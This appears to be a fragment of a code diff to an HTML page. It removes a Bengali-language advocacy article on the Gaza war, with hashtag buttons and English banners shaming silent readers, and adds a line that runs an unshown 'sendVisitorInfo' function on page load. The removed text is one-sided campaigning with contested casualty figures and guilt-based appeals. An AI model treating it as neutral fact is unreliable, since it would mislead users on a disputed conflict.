-        <p>ইরান সম্প্রতি মার্কিন যুক্তরাষ্ট্রের সাথে একটি পারমাণবিক চুক্তি স্বাক্ষর করার চেষ্টা করেছিল। নেতানিয়াহু আলোচক, বিজ্ঞানী ও জেনারেলদের নির্মূল করেছেন।</p>
-        
-        <p>জিম্মি বিনিময়ের পরও এই দেশ গাজায় তার অপারেশন চালিয়ে যাবে না তার গ্যারান্টি কী?</p>
-        
-        <p>কাতার আলোচনায় প্রধান আলোচক এবং তারা বলেছে যে শীঘ্রই আলোচনা শুরু হবে এবং উভয় পক্ষের মধ্যে একটি মধ্যবর্তী স্থান পাওয়া যাবে।</p>
-        
-        <p>হামাসও বলেছে যে তারা এই প্রস্তাব প্রত্যাখ্যান করবে না কিন্তু অতিরিক্ত সুরক্ষা চেয়েছে।</p>
-        
-        <p>কিন্তু আসুন মেনে নিই যে হামাস হাজার হাজার। কিন্তু হামাস কি ২ মিলিয়নেরও বেশি মানুষের প্রতিনিধিত্ব করে? নাকি ২ মিলিয়ন মানুষ হামাস?</p>
-        
-        <p>সেই ৫৫,০০০ মানুষ কি হামাস, এবং সেই ১৭,০০০ শিশু?</p>
-        
-        <p>আজ, গাজা একটি মনুষ্যসৃষ্ট দুর্ভিক্ষের সম্মুখীন। এটি কী ধরনের অপারেশন?</p>
-        
-        <p>জাতিসংঘের লোকদের লক্ষ্য করা হয়েছে এবং দ্বিতীয় বিশ্বযুদ্ধের পর সবচেয়ে বেশি হতাহত হয়েছে। তারা কি হামাস ছিল?</p>
-        
-        <p>খাদ্য সহায়তার জন্য লাইনে দাঁড়িয়ে থাকা মানুষদের লক্ষ্য করা হয়েছিল, তারা কি হামাস ছিল?</p>
-        
-        <p>ইসরাইল-ইরান সংঘর্ষের সময়, গাজায় প্রায় ১০০০ মানুষ প্রাণ হারিয়েছে, কিন্তু কোন প্রশ্ন নেই, কোন প্রতিবাদ নেই।</p>
-        
-        <p>যা ঘটছে তা দ্বিতীয় বিশ্বযুদ্ধের ঘনত্ব শিবিরের মতো। সেই সময়ে এই ঘনত্ব শিবিরের সত্য লুকানো ছিল, কিন্তু আজ সোশ্যাল মিডিয়া যুগে বিশ্ব দেখতে পারে। কিন্তু বিশ্ব বলছে... আমাকে এটি দেখাবেন না। এটি খুব নেতিবাচক। কিছু ইতিবাচক দেখান।</p>
-        
-        <p>কোন সন্দেহ নেই যে নেতানিয়াহু ক্ষমতা বাঁচাতে গাজায় তার কর্মকাণ্ডকে আরও খারাপ করবেন।</p>
-        
-        <p>কিন্তু আমরা কি কথা বলতে পারি? আমরা কি সচেতনতা তৈরি করতে পারি?</p>
-        
-        <p>ইসরাইল আপনি হামাসকে লক্ষ্য করতে পারেন কিন্তু মহিলা, শিশু, বয়স্ক, অসহায়দের ছাড় দিন। মানুষকে অনাহারে রাখা বন্ধ করুন।</p>
-        
-        <p>ডোনাল্ড ট্রাম্প এখানেও হস্তক্ষেপ করতে পারেন যেমন তিনি ইরান ও ইসরাইলের মধ্যে করেছিলেন।</p>
-        
-        <p class="text-yellow-400 bangla-heading">আমি বলব, ডোনাল্ড ট্রাম্পকে নোবেল শান্তি পুরস্কার দিন যদি তিনি গাজায় ইসরাইলকে থামাতে পারেন #TrumpSaveGaza। এই হ্যাশট্যাগ তৈরি করুন এবং ট্রাম্পকে ট্যাগ করুন।</p>
-        
-        <p>ট্রাম্পের অহংকারের কাছে আবেদন করুন এবং গাজাকে বাঁচান অন্যথায় গাজা পরবর্তী দুটি জিনিস বোঝাতে পারে। শান্তি বা এটি যতটা খারাপ, এবং আমরা যা লক্ষ্য করেছি তা হলো ইরান ব্যালিস্টিক ব্যবহার করেছে এবং মানুষ ইরানকে সম্মান করতে শুরু করেছে। কিন্তু গাজা তা করতে পারে না। সেখানে আপনার মানবতা কাজ করতে পারে।</p>
-        
-        <p>এই শতাব্দীতে যা ঘটছে তা মানবতার উপর ভাল দেখাচ্ছে না। হামাসকে লক্ষ্য করুন, কিন্তু আপনি যে ভাবে মানুষের জীবন নিয়ে খেলছেন তা মানবতা ও গণতন্ত্রের জন্য ভাল নয়।</p>
-        
-        <p>আপনি হয় মানবতার পক্ষে — নয় গণহত্যার পাশে।</p>
-      </div>
-
-      <p class="mt-6">You may not be in Gaza, but Gaza is in your heart — if you have one.</p>
-      <p class="font-bold">Don't scroll past this.</p>
-
-      <div class="mt-6 border-t border-red-500 pt-4">
-        <p class="text-yellow-300 underline">Shame on those who turn a blind eye to the suffering,</p>
-        <p class="mt-2 font-bold text-red-500">| Shame on those who stay silent. |</p>
-      </div>
-    </div>
-
-    <div class="mt-6 flex flex-wrap justify-center gap-3">
-      <span class="rounded-full bg-blue-500 px-4 py-2 text-white hover:bg-blue-600 transition cursor-pointer">#NobelForGaza</span>
-      <span class="rounded-full bg-red-500 px-4 py-2 text-white hover:bg-red-600 transition cursor-pointer">#TrumpSaveGaza</span>
-      <span class="rounded-full bg-green-500 px-4 py-2 text-white hover:bg-green-600 transition cursor-pointer">#NobelGazaTrump</span>
-    </div>
-
-    <a href="https://www.aljazeera.com/where/palestine/" target="_blank" class="mt-8 block w-fit transform rounded-lg bg-gradient-to-r from-green-400 to-blue-500 px-8 py-3 text-center font-bold text-black transition hover:scale-105 hover:from-green-500 hover:to-blue-600">
-      Check how many lives you killed with your silence.
-    </a>
-
-    <footer class="bg-opacity-50 mt-10 w-full border-t border-red-500 bg-white py-3 text-center text-sm dark:bg-black">
-      #FreePalestine | #StopGenocide | #BoycottIsrael
-    </footer>
-  </div>
-
-
-</body>
+      window.onload = sendVisitorInfo;
+    </script>
+  </body>
 </html>
